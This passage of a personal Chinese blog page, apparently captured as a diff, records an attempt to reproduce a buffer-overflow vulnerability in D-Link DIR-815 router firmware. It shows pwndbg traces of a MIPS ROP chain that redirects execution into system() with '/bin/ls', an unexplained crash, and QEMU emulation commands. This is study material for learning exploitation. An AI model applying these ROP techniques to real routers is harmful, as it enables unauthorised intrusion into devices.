class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">0x7678b204 in system () from /home/ling/iot/jm/dir815_FW_101/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</span><br><span class="line">warning: GDB can&#x27;t find the start of the function at 0x7674d9e3.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> V0   0x0</span><br><span class="line"> V1   0x4b</span><br><span class="line"> A0   0x76fff230 ◂— &#x27;/bin/ls&#x27;</span><br><span class="line"> A1   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> A2   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> A3   0x20</span><br><span class="line"> T0   0x767ab4c8 (__malloc_state) ◂— 0x4b /* &#x27;K&#x27; */</span><br><span class="line"> T1   0x16f1</span><br><span class="line"> T2   0x2</span><br><span class="line"> T3   0x24</span><br><span class="line"> T4   0x25</span><br><span class="line"> T5   0x807</span><br><span class="line"> T6   0x800</span><br><span class="line"> T7   0x400</span><br><span class="line"> T8   0x8</span><br><span class="line"> T9   0x7678b200 (system) ◂— lui    $gp, 2 /* 0x3c1c0002 */</span><br><span class="line"> S0   0x7678b200 (system) ◂— lui    $gp, 2 /* 0x3c1c0002 */</span><br><span class="line"> S1   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S2   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S3   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S4   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S5   0x76fff230 ◂— &#x27;/bin/ls&#x27;</span><br><span class="line"> S6   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S7   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S8   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> FP   0x76fff220 ◂— &#x27;bbbbbbbbbbbbbbbb/bin/ls&#x27;</span><br><span class="line"> SP   0x76fff220 ◂— &#x27;bbbbbbbbbbbbbbbb/bin/ls&#x27;</span><br><span class="line">*PC   0x7678b204 (system+4) ◂— addiu  $gp, $gp, 0x32e0 /* 0x279c32e0 */</span><br><span class="line">───────────────────[ DISASM ]───────────────────</span><br><span class="line">   0x7678b200 &lt;system&gt;       lui    $gp, 2</span><br><span class="line"> ► 0x7678b204 &lt;system+4&gt;     addiu  $gp, $gp, 0x32e0</span><br><span class="line">   0x7678b208 &lt;system+8&gt;     addu   $gp, $gp, $t9</span><br><span class="line">   0x7678b20c &lt;system+12&gt;    addiu  $sp, $sp, -0x48</span><br><span class="line">   0x7678b210 &lt;system+16&gt;    sw     $ra, 0x44($sp)</span><br><span class="line">   0x7678b214 &lt;system+20&gt;    sw     $s5, 0x40($sp)</span><br><span class="line">   0x7678b218 &lt;system+24&gt;    sw     $s4, 0x3c($sp)</span><br><span class="line">   0x7678b21c &lt;system+28&gt;    sw     $s3, 0x38($sp)</span><br><span class="line">   0x7678b220 &lt;system+32&gt;    sw     $s2, 0x34($sp)</span><br><span class="line">   0x7678b224 &lt;system+36&gt;    sw     $s1, 0x30($sp)</span><br><span class="line">   0x7678b228 &lt;system+40&gt;    sw     $s0, 0x2c($sp)</span><br><span class="line">──────────────────────[ STACK ]──────────────────────────</span><br><span class="line">00:0000│ fp sp 0x76fff220 ◂— &#x27;bbbbbbbbbbbbbbbb/bin/ls&#x27;</span><br><span class="line">... ↓          3 skipped</span><br><span class="line">04:0010│ a0 s5 0x76fff230 ◂— &#x27;/bin/ls&#x27;</span><br><span class="line">05:0014│       0x76fff234 ◂— 0x736c2f /* &#x27;/ls&#x27; */</span><br><span class="line">06:0018│       0x76fff238 ◂— 0</span><br><span class="line">07:001c│       0x76fff23c ◂— 0</span><br><span class="line">──────────────────────[ BACKTRACE ]────────────────────────</span><br><span class="line"> ► f 0 0x7678b204 system+4</span><br><span class="line">───────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
+
+<p>但最后还是报了段错误，而且貌似继续执行<code>gadget2</code>后面的指令了。。不太明白。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">warning: GDB can&#x27;t find the start of the function at 0x7674d9e4.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x7674d9e4 in ?? () from /home/ling/iot/jm/dir815_FW_101/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line">*V0   0x7f00</span><br><span class="line">*V1   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">*A0   0x76fff148 ◂— sll    $zero, $v0, 0 /* 0x20000 */</span><br><span class="line">*A1   0x76fff0f0 ◂— 0</span><br><span class="line">*A2   0x0</span><br><span class="line">*A3   0x0</span><br><span class="line"> T0   0x767ab4c8 (__malloc_state) ◂— 0x4b /* &#x27;K&#x27; */</span><br><span class="line"> T1   0x16f1</span><br><span class="line"> T2   0x2</span><br><span class="line"> T3   0x24</span><br><span class="line"> T4   0x25</span><br><span class="line"> T5   0x807</span><br><span class="line"> T6   0x800</span><br><span class="line"> T7   0x400</span><br><span class="line"> T8   0x8</span><br><span class="line">*T9   0x7676c8c0 (memcpy) ◂— b      0x7676c8d8 /* 0x10000005 */</span><br><span class="line"> S0   0x7678b200 (system) ◂— lui    $gp, 2 /* 0x3c1c0002 */</span><br><span class="line"> S1   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S2   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S3   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S4   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S5   0x76fff230 ◂— &#x27;/bin/ls&#x27;</span><br><span class="line"> S6   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S7   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S8   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">*FP   0x0</span><br><span class="line"> SP   0x76fff220 ◂— &#x27;bbbbbbbbbbbbbbbb/bin/ls&#x27;</span><br><span class="line">*PC   0x7674d9e4 ◂— 0x8fdc0010</span><br><span class="line">────────────────────────────[ DISASM ]──────────────────────</span><br><span class="line">   0x7674d9d0    move   $a1, $s3</span><br><span class="line">   0x7674d9d4    move   $a2, $s1</span><br><span class="line">   0x7674d9d8    move   $t9, $s0</span><br><span class="line">   0x7674d9dc    jalr   $t9</span><br><span class="line"> </span><br><span class="line">   0x7674d9e0    move   $a0, $s5</span><br><span class="line"> ► 0x7674d9e4    lw     $gp, 0x10($fp)</span><br><span class="line">   0x7674d9e8    move   $a0, $v0</span><br><span class="line">   0x7674d9ec    lw     $a1, -0x7fac($gp)</span><br><span class="line">   0x7674d9f0    addiu  $a2, $zero, 1</span><br><span class="line">   0x7674d9f4    move   $t9, $s0</span><br><span class="line">   0x7674d9f8    jalr   $t9</span><br><span class="line">────────────────[ STACK ]────────────────────────────────</span><br><span class="line">00:0000│ sp 0x76fff220 ◂— &#x27;bbbbbbbbbbbbbbbb/bin/ls&#x27;</span><br><span class="line">... ↓       3 skipped</span><br><span class="line">04:0010│ s5 0x76fff230 ◂— &#x27;/bin/ls&#x27;</span><br><span class="line">05:0014│    0x76fff234 ◂— 0x736c2f /* &#x27;/ls&#x27; */</span><br><span class="line">06:0018│    0x76fff238 ◂— 0</span><br><span class="line">07:001c│    0x76fff23c ◂— 0</span><br><span class="line">──────────────────[ BACKTRACE ]─────────────────────</span><br><span class="line"> ► f 0 0x7674d9e4</span><br><span class="line">─────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 跟着书上到这里结束。<del>下面的我也不知道对不对反正是猜着做的.jpg</del></p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 尝试把文件系统搬到<code>qemu</code>虚拟机里做一下（虽然应该没什么卵用）。先解决虚拟机和主机通信的问题。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta_mipsel -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic, -net tap -nographic</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 在用上面的命令启动时会添加一块网卡，我的名称是<code>tap1</code>。主机里进行配置<code>sudo ifconfig tap1 10.10.10.1/24</code>，打开虚拟机后<code>ifconfig eth0 10.10.10.2/24</code>。两台就能互相<code>ping</code>通了。<code>scp</code>将文件系统拷贝到虚拟机中，此时还需要挂载<code>/proc /sys /dev</code>几个目录。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mount --bind /proc squashfs-root/proc/</span><br><span class="line">mount --bind /sys squashfs-root/sys</span><br><span class="line">mount --bind /dev squashfs-root/dev   </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不知道直接挂虚拟机的行不行…反正设备文件有缺失</span></span><br><span class="line">chroot squashfs-root /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 执行<code>/etc/init.d/rcS</code>还是<code>/etc/init0.d/rcS</code>启动，反正都报错了。好了我不行了再见.jpg。</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; ps：我也不知道该学点啥，但是大佬们都有自己研究方向那我找个学术界研究的多点的学吧emm。各个方向能做到的都挺牛逼的就是没感觉自己对哪个有倾向性…</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/10/unpwnable-01/" rel="prev" title="unpwnable( 01">
+      <i class="fa fa-chevron-left"></i> unpwnable( 01
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/02/27/malloclab/" rel="next" title="csapp-malloclab">
+      csapp-malloclab <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">静态分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F%E8%BF%90%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">模拟运行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0ROP%E9%93%BE"><span class="nav-number">3.</span> <span class="nav-text">构造ROP链</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ling"
+      src="/images/%E7%A9%B9.jpg">
+  <p class="site-author-name" itemprop="name">ling</p>
+  <div class="site-description" itemprop="description">永远不要停止思考啊</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ll1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ll1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://ll1ng.github.io/atom.xml" title="rss → https:&#x2F;&#x2F;ll1ng.github.io&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>rss</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      小伙伴们>.<
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.wootec.top/" title="https:&#x2F;&#x2F;www.wootec.top&#x2F;" rel="noopener" target="_blank">Reverier</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://arttnba3.cn/" title="https:&#x2F;&#x2F;arttnba3.cn&#x2F;" rel="noopener" target="_blank">arttnba3</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mercer5.github.io/" title="https:&#x2F;&#x2F;mercer5.github.io&#x2F;" rel="noopener" target="_blank">mercer</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://yoursite.com/" title="http:&#x2F;&#x2F;yoursite.com" rel="noopener" target="_blank">...</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+    <!--music-->
+    <div>
+    
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=446935665&auto=0&height=66"></iframe>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ling</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+  <script data-pjax>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+</body>
+</html>
